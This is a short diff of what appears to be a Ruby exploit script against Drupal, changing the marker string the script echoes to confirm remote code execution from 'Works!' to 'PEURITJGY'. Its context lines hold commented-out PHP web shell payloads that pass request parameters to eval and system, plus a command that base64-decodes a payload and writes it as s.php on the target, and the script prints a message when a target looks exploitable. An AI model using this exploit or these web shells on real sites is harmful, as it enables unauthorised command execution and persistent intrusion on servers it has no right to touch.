@@ -48,7 +48,7 @@ end
 #evil = '<?php if( isset( $_REQUEST["c"] ) ) { eval( $_GET[c]) ); } ?>'
 # evil = '<?php if( isset( $_REQUEST["c"] ) ) { system( $_REQUEST["c"] . " 2>&1" ); }'
 # evil = "echo " + Base64.strict_encode64(evil).strip + " | base64 -d | tee s.php"
-evil = 'echo Works!'
+evil = 'echo PEURITJGY'
 
 # Try and get version
 drupalversion = if ARGV[1] then ARGV[1] else nil end
@@ -166,7 +166,7 @@ response = http.request(req)
 if response.code == "200"
   #puts "[+] Result: " + JSON.pretty_generate(JSON[response.body])
   result = drupalversion.start_with?('8')? JSON.parse(response.body)[0]["data"] : response.body
-  if result.include? "Works!"
+  if result.include? "PEURITJGY"
     puts "[+] Target seems to be exploitable! w00hooOO!"
     puts "[+] Result: #{result}"
   else
